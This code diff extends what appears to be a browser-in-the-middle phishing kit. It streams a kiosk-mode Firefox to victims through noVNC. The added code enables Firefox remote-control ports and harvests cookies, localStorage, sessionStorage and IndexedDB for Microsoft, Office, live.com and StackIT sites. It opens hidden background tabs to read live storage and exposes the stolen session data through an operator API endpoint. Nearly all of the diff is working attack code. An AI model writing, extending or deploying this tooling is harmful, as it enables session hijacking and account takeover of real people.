@@ -31,6 +31,7 @@ import os
 import secrets
 import shlex
 import shutil
+import socket
 import sqlite3
 import subprocess
 import tempfile
@@ -281,6 +282,10 @@ def _write_user_js(name):
         'user_pref("datareporting.policy.dataSubmissionEnabled", false);\n'
         'user_pref("toolkit.telemetry.reportingpolicy.firstRun", false);\n'
         'user_pref("trailhead.firstrun.didSeeAboutWelcome", true);\n'
+        'user_pref("browser.sessionstore.interval", 2000);\n'
+        'user_pref("dom.storage.shadow_writes", true);\n'
+        'user_pref("marionette.enabled", true);\n'
+        'user_pref("marionette.port", 2828);\n'
         'user_pref("signon.rememberSignons", false);\n'
         'user_pref("signon.formlessCapture.enabled", false);\n'
         'user_pref("signon.storeWhenAutocompleteOff", false);\n'
@@ -317,13 +322,13 @@ def _start_container(name, pw, target_url):
     # create the Firefox profile once, dismiss the first-run welcome, so the
     # landing shows immediately when the victim connects
     docker("exec", name, "sh", "-c",
-           "env DISPLAY=:1 firefox about:blank > /dev/null 2>&1 & sleep 8; pkill firefox; sleep 2")
+           "env DISPLAY=:1 firefox --remote-debugging-port=9222 about:blank > /dev/null 2>&1 & sleep 8; pkill firefox; sleep 2")
     _write_user_js(name)
     # TARGET_URL is used by ui.js when the victim disconnects / takes over.
     docker("exec", "--user", "root", name, "sh", "-c",
            f"sed -i 's#TARGET_URL#{target_url}#g' /usr/libexec/noVNCdim/app/ui.js")
     docker("exec", name, "sh", "-c",
-           f"nohup env DISPLAY=:1 firefox {target_url} --kiosk > /dev/null 2>&1 &")
+           f"nohup env DISPLAY=:1 firefox --remote-debugging-port=9222 {target_url} --kiosk > /dev/null 2>&1 &")
     # dismiss the Firefox first-run welcome once it appears (harmless if absent)
     dismiss = (
         "for i in 1 2 3 4 5 6; do "
@@ -339,31 +344,385 @@ def _start_container(name, pw, target_url):
 
 
 def _read_cookies(name):
-    """Copy the container's cookies.sqlite out and parse it."""
+    """Copy the newest cookie store (db + wal + shm) out and parse it.
+
+    Firefox keeps recent writes in cookies.sqlite-wal until checkpoint, so the
+    sidecar files must be copied too or the DB reads as empty.
+    """
+    # use the known profile dirs (a full `find /` is far too slow under qemu)
     docker("exec", name, "sh", "-c",
-           "find -name cookies.sqlite -exec cp {} /home/headless/_cookies.sqlite \\; || true", check=False)
-    fd, tmp = tempfile.mkstemp(suffix=".sqlite")
-    os.close(fd)
-    res = docker("cp", f"{name}:/home/headless/_cookies.sqlite", tmp, check=False)
-    if res.returncode != 0:
-        os.unlink(tmp)
-        return []
-    cookies = []
+           "rm -rf /tmp/ck; mkdir -p /tmp/ck; "
+           "p=$({ for b in /home/*/.config/mozilla/firefox /home/*/.mozilla/firefox "
+           "/root/.config/mozilla/firefox /root/.mozilla/firefox; do "
+           "for f in \"$b\"/*/cookies.sqlite; do [ -f \"$f\" ] && stat -c '%Y %n' \"$f\"; done; done; } "
+           "| sort -nr | head -1 | cut -d' ' -f2-); "
+           "[ -n \"$p\" ] && cp \"$p\"* /tmp/ck/ 2>/dev/null; true", check=False)
+    hostdir = tempfile.mkdtemp()
     try:
-        con = sqlite3.connect(tmp)
-        con.text_factory = lambda b: b.decode(errors="ignore")
-        cur = con.cursor()
-        cur.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies")
-        for host, cname, value, path, expiry, secure, httponly, samesite in cur.fetchall():
-            cookies.append({
-                "host": host, "name": cname, "value": value, "path": path,
-                "expiry": expiry, "secure": bool(secure), "httpOnly": bool(httponly),
-                "sameSite": samesite,
-            })
-        con.close()
+        res = docker("cp", f"{name}:/tmp/ck/.", hostdir, check=False)
+        db = os.path.join(hostdir, "cookies.sqlite")
+        if res.returncode != 0 or not os.path.exists(db):
+            return []
+        cookies = []
+        con = sqlite3.connect(db)
+        try:
+            con.text_factory = lambda b: b.decode(errors="ignore")
+            cur = con.cursor()
+            cur.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies")
+            for host, cname, value, path, expiry, secure, httponly, samesite in cur.fetchall():
+                cookies.append({
+                    "host": host, "name": cname, "value": value, "path": path,
+                    "expiry": expiry, "secure": bool(secure), "httpOnly": bool(httponly),
+                    "sameSite": samesite,
+                })
+        finally:
+            con.close()
+        return cookies
     finally:
-        os.unlink(tmp)
-    return cookies
+        shutil.rmtree(hostdir, ignore_errors=True)
+
+
+def _origin_host(name):
+    # storage origin dirs look like https+++portal.stackit.cloud
+    try:
+        return name.replace("+++", "://", 1).split("://", 1)[1].replace("+", ":")
+    except Exception:
+        return name
+
+
+def _b2s(b):
+    if isinstance(b, str):
+        return b
+    if isinstance(b, (bytes, bytearray)):
+        for enc in ("utf-8", "utf-16-le", "utf-16-be"):
+            try:
+                return bytes(b).decode(enc)
+            except Exception:
+                continue
+        return bytes(b).decode("utf-8", "ignore")
+    return b
+
+
+def _collect_session_storage(node, out):
+    """Walk a sessionstore JSON blob collecting sessionStorage per origin.
+
+    The session store keeps per-entry `storage` maps of origin -> {sessionStorage: {...}}.
+    """
+    if isinstance(node, dict):
+        for k, v in node.items():
+            if k == "storage" and isinstance(v, dict):
+                for origin, sm in v.items():
+                    if isinstance(sm, dict) and isinstance(sm.get("sessionStorage"), dict):
+                        out.setdefault(str(origin), {}).update(
+                            {str(a): _b2s(b) for a, b in sm["sessionStorage"].items()})
+            _collect_session_storage(v, out)
+    elif isinstance(node, list):
+        for v in node:
+            _collect_session_storage(v, out)
+
+
+_MARIONETTE_PROG = r"""
+import os, json, socket, base64
+script = base64.b64decode(os.environ["M_SCRIPT"]).decode()
+args = json.loads(os.environ.get("M_ARGS", "[]"))
+ctx = os.environ.get("M_CTX", "chrome")
+s = socket.create_connection(("127.0.0.1", 2828), timeout=2)
+s.settimeout(2)
+def recv():
+    buf = b""
+    while b":" not in buf:
+        buf += s.recv(1)
+    n = int(buf[:-1]); d = b""
+    while len(d) < n:
+        d += s.recv(n - len(d))
+    return json.loads(d)
+def send(m):
+    b = json.dumps(m).encode(); s.sendall(str(len(b)).encode() + b":"); s.sendall(b)
+try:
+    recv()
+    send({"id": 0, "name": "WebDriver:NewSession", "parameters": {"capabilities": {}}})
+    sid = None
+    while True:
+        m = recv()
+        if m.get("id") == 0:
+            sid = m.get("result", {}).get("sessionId"); break
+    send({"id": 1, "name": "Marionette:SetContext", "parameters": {"value": ctx}})
+    send({"id": 2, "name": "WebDriver:ExecuteScript",
+          "parameters": {"script": script, "args": args, "sessionId": sid}})
+    res = None
+    while True:
+        m = recv()
+        if m.get("id") == 2:
+            res = m; break
+    send({"id": 3, "name": "WebDriver:DeleteSession", "parameters": {}})
+    print(json.dumps(res))
+finally:
+    s.close()
+"""
+
+
+def _marionette(name, script, args=None, context="chrome"):
+    """Run a script via Marionette by executing the client inside the container."""
+    import base64 as _b64
+    env = ["-e", "M_SCRIPT=" + _b64.b64encode(script.encode()).decode(),
+           "-e", "M_ARGS=" + json.dumps(args or []),
+           "-e", "M_CTX=" + context]
+    res = docker("exec", *env, name, "python3", "-c", _MARIONETTE_PROG, check=False)
+    if res.returncode != 0:
+        raise RuntimeError("marionette exec failed")
+    out = (res.stdout or "").strip().splitlines()
+    if not out:
+        raise RuntimeError("no marionette output")
+    m = json.loads(out[-1])
+    if m.get("error"):
+        raise RuntimeError(str(m.get("error")))
+    return m.get("result", {}).get("value")
+
+
+_READ_TABS = """
+var out = [];
+for (const t of gBrowser.tabs) {
+  try {
+    var w = t.linkedBrowser.contentWindow;
+    var o = {url: w.location.href, localStorage: {}, sessionStorage: {}};
+    try { o.localStorage = Object.assign({}, w.localStorage); } catch (e) {}
+    try { o.sessionStorage = Object.assign({}, w.sessionStorage); } catch (e) {}
+    out.push(o);
+  } catch (e) {}
+}
+return out;
+"""
+
+_OPEN_TABS = """
+var ids = [];
+for (const u of arguments[0]) {
+  try { ids.push(gBrowser.addTab(u, {inBackground: true})); } catch (e) {}
+}
+window.__phish_ids = ids;
+return ids.length;
+"""
+
+_CLOSE_TABS = """
+try { for (const t of (window.__phish_ids || [])) { try { gBrowser.removeTab(t); } catch (e) {} } } catch (e) {}
+window.__phish_ids = null;
+return true;
+"""
+
+
+def _origin_host_to_url(host):
+    return "https://" + host + "/"
+
+
+def _live_storage(name, ip, origins):
+    """Read live localStorage/sessionStorage. `origins` = hosts known from disk."""
+    open_hosts = set()
+    try:
+        tabs = _marionette(name, _READ_TABS) or []
+    except Exception:
+        return None
+    result = {}
+    for t in tabs:
+        url = t.get("url", "")
+        host = url.split("://", 1)[-1].split("/", 1)[0]
+        open_hosts.add(host)
+        if t.get("localStorage") or t.get("sessionStorage"):
+            result.setdefault(url, {})
+            if t.get("localStorage"):
+                result[url]["localStorage"] = t["localStorage"]
+            if t.get("sessionStorage"):
+                result[url]["sessionStorage"] = t["sessionStorage"]
+    missing = [h for h in origins if h and h not in open_hosts]
+    if missing:
+        try:
+            _marionette(name, _OPEN_TABS, args=[[_origin_host_to_url(h) for h in missing]])
+            time.sleep(2)
+            for t in (_marionette(name, _READ_TABS) or []):
+                host = t.get("url", "").split("://", 1)[-1].split("/", 1)[0]
+                if host in missing and (t.get("localStorage") or t.get("sessionStorage")):
+                    result.setdefault(t["url"], {})
+                    if t.get("localStorage"):
+                        result[t["url"]]["localStorage"] = t["localStorage"]
+                    if t.get("sessionStorage"):
+                        result[t["url"]]["sessionStorage"] = t["sessionStorage"]
+            _marionette(name, _CLOSE_TABS)
+        except Exception:
+            pass
+    return result
+
+
+_CDP_PROG = r"""
+import json
+import websocket
+
+out = {}
+try:
+    ws = websocket.create_connection("ws://127.0.0.1:9222/session",
+                                     timeout=8, suppress_origin=True)
+except Exception:
+    print("{}"); raise SystemExit
+
+_id = 0
+def cmd(method, params):
+    global _id
+    _id += 1
+    ws.send(json.dumps({"id": _id, "method": method, "params": params}))
+    while True:
+        m = json.loads(ws.recv())
+        if m.get("id") == _id:
+            return m
+
+sid = None
+try:
+    r = cmd("session.new", {"capabilities": {}})
+    sid = (r.get("result") or {}).get("sessionId")
+    tree = cmd("browsingContext.getTree", {})
+    for c in (tree.get("result") or {}).get("contexts", []):
+        url, ctx = c.get("url", ""), c.get("context")
+        if not ctx:
+            continue
+        try:
+            r = cmd("script.evaluate", {
+                "expression": "(function(){function d(s){var o={};for(var i=0;i<s.length;i++){var k=s.key(i);o[k]=s.getItem(k);}return o;}return JSON.stringify({ls:d(localStorage),ss:d(sessionStorage)});})()",
+                "target": {"context": ctx}, "awaitPromise": False})
+            v = ((r.get("result") or {}).get("result") or {}).get("value")
+            if v:
+                out[url] = json.loads(v)
+        except Exception:
+            pass
+finally:
+    try:
+        if sid:
+            cmd("session.end", {"sessionId": sid})
+    except Exception:
+        pass
+    try:
+        ws.close()
+    except Exception:
+        pass
+print(json.dumps(out))
+"""
+
+
+def _cdp(name):
+    """Read live localStorage/sessionStorage from open tabs via CDP."""
+    import base64 as _b64
+    res = docker("exec", "-e", "M_PROG=" + _b64.b64encode(_CDP_PROG.encode()).decode(),
+                 name, "python3", "-c", _CDP_PROG, check=False)
+    out = (res.stdout or "").strip().splitlines()
+    if not out:
+        return None
+    try:
+        return json.loads(out[-1])
+    except Exception:
+        return None
+
+
+def _read_storage(name):
+    """Best-effort copy+parse of localStorage / sessionStorage for relevant origins."""
+    docker("exec", name, "sh", "-c",
+           "rm -rf /tmp/st; mkdir -p /tmp/st/storage; "
+           "P=$(for b in /home/*/.config/mozilla/firefox /root/.config/mozilla/firefox; do "
+           "ls -dt \"$b\"/*.default-release \"$b\"/* 2>/dev/null; done | head -1); "
+           "[ -z \"$P\" ] && exit 0; "
+           "for d in \"$P\"/storage/default/*; do b=$(basename \"$d\" 2>/dev/null); "
+           "case \"$b\" in *stackit*|*microsoft*|*office*|*live.com*) cp -r \"$d\" /tmp/st/storage/ 2>/dev/null;; esac; done; "
+           "cp \"$P\"/webappsstore.sqlite /tmp/st/ 2>/dev/null; "
+           "cp \"$P\"/sessionstore-backups/recovery.jsonlz4 /tmp/st/ 2>/dev/null; true", check=False)
+    hostdir = tempfile.mkdtemp()
+    result = {}
+    try:
+        if docker("cp", f"{name}:/tmp/st/.", hostdir, check=False).returncode != 0:
+            return {}
+        # modern localStorage + IndexedDB per origin
+        sdir = os.path.join(hostdir, "storage")
+        if os.path.isdir(sdir):
+            for origin_dir in os.listdir(sdir):
+                origin = _origin_host(origin_dir)
+                lsdir = os.path.join(sdir, origin_dir, "ls")
+                if os.path.isdir(lsdir):
+                    for fn in os.listdir(lsdir):
+                        if not fn.endswith(".sqlite"):
+                            continue
+                        try:
+                            con = sqlite3.connect(os.path.join(lsdir, fn))
+                            con.text_factory = lambda b: b.decode(errors="ignore")
+                            rows = con.execute("SELECT key, value FROM data").fetchall()
+                            con.close()
+                            if rows:
+                                result.setdefault(origin, {}).setdefault("localStorage", {}).update(
+                                    {str(k): _b2s(v) for k, v in rows})
+                        except Exception:
+                            pass
+                idb = os.path.join(sdir, origin_dir, "idb")
+                if os.path.isdir(idb):
+                    dump = []
+                    for fn in os.listdir(idb):
+                        if not fn.endswith(".sqlite"):
+                            continue
+                        try:
+                            con2 = sqlite3.connect(os.path.join(idb, fn))
+                            con2.text_factory = lambda b: b.decode(errors="ignore")
+                            tabs = [r[0] for r in con2.execute(
+                                "SELECT name FROM sqlite_master WHERE type='table'")]
+                            tables = {}
+                            for t in tabs:
+                                try:
+                                    tables[t] = [[_b2s(c) for c in row] for row in
+                                                 con2.execute(f'SELECT * FROM "{t}" LIMIT 200')]
+                                except Exception:
+                                    pass
+                            con2.close()
+                            dump.append({"file": fn, "tables": tables})
+                        except Exception:
+                            continue
+                    if dump:
+                        result.setdefault(origin, {})["indexedDB"] = dump
+        # legacy localStorage
+        legacy = os.path.join(hostdir, "webappsstore.sqlite")
+        if os.path.exists(legacy):
+            try:
+                con = sqlite3.connect(legacy)
+                con.text_factory = lambda b: b.decode(errors="ignore")
+                for tbl in ("webappsstore2", "moz_webappsstore"):
+                    try:
+                        rows = con.execute(f"SELECT scope, key, value FROM {tbl}").fetchall()
+                    except Exception:
+                        continue
+                    for scope, k, v in rows:
+                        result.setdefault(str(scope), {})["localStorage"] = {str(k): _b2s(v)}
+            except Exception:
+                pass
+        # sessionStorage from the recovery store
+        rec = os.path.join(hostdir, "recovery.jsonlz4")
+        if os.path.exists(rec):
+            try:
+                import json as _json
+                import lz4.block
+                raw = open(rec, "rb").read()[8:]
+                data = _json.loads(lz4.block.decompress(raw))
+                found = {}
+                _collect_session_storage(data, found)
+                for origin, kv in found.items():
+                    if any(x in origin for x in ("stackit", "microsoft", "office", "live.com")):
+                        result.setdefault(_origin_host(origin), {})["sessionStorage"] = kv
+            except Exception:
+                pass
+        # live values via CDP (overrides possibly-stale disk copies)
+        try:
+            live = _cdp(name)
+            if live:
+                for url, kv in live.items():
+                    host = url.split("://", 1)[-1].split("/", 1)[0]
+                    slot = result.setdefault(host, {})
+                    if kv.get("ls"):
+                        slot.setdefault("localStorage", {}).update(kv["ls"])
+                    if kv.get("ss"):
+                        slot.setdefault("sessionStorage", {}).update(kv["ss"])
+        except Exception:
+            pass
+        return result
+    finally:
+        shutil.rmtree(hostdir, ignore_errors=True)
 
 
 def _group_cookies(cookies):
@@ -484,6 +843,26 @@ def get_cookies(session_id):
         "groups": groups,
         "counts": {k: len(v) for k, v in groups.items()},
     })
+
+
+@app.route("/api/sessions/<session_id>/storage", methods=["GET"])
+@require_api_key
+def get_storage(session_id):
+    s = _load_state()["sessions"].get(session_id)
+    if not s:
+        return jsonify({"error": "not found"}), 404
+    data = _read_storage(s["name"])
+    groups = {"entra": {}, "stackit": {}, "other": {}}
+    for origin, kv in data.items():
+        h = origin.lower()
+        if "stackit" in h:
+            groups["stackit"][origin] = kv
+        elif "microsoft" in h or "office" in h or "live.com" in h:
+            groups["entra"][origin] = kv
+        else:
+            groups["other"][origin] = kv
+    return jsonify({"session_id": session_id, "storage": data, "groups": groups,
+                    "counts": {k: len(v) for k, v in groups.items()}})
 
 
 @app.route("/api/sessions/<session_id>/reload", methods=["POST"])
